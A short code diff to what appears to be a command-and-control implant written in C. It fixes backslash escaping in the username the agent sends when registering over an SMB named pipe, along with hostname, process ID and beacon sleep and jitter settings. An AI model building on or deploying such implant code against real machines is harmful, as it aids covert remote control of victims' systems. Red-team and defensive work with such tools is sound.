@@ -85,13 +85,18 @@ int transport_smb_register(void) {
     ULONG usz=sizeof(username);
     if (!GetUserNameExA(2 /*NameSamCompatible*/, username, &usz))
         GetUserNameA(username, (DWORD*)&usz);
+    char username_j[512]={0};
+    for (int _i=0,_j=0; username[_i]&&_j<(int)sizeof(username_j)-2; _i++) {
+        if (username[_i]=='\\') username_j[_j++]='\\';
+        username_j[_j++]=username[_i];
+    }
 
     char body[1024];
     snprintf(body, sizeof(body),
         "{\"type\":\"REGISTER\",\"hostname\":\"%s\",\"username\":\"%s\","
         "\"os\":\"windows/amd64\",\"pid\":%lu,\"transport\":\"smb\","
         "\"sleep_sec\":%d,\"jitter_pct\":%d,\"language\":\"c\"}",
-        hostname, username, (unsigned long)GetCurrentProcessId(),
+        hostname, username_j, (unsigned long)GetCurrentProcessId(),
         AGENT_SLEEP_SEC, AGENT_JITTER_PCT);
 
     if (!pipe_write_msg(g_smb_pipe, (const uint8_t*)body, strlen(body)))
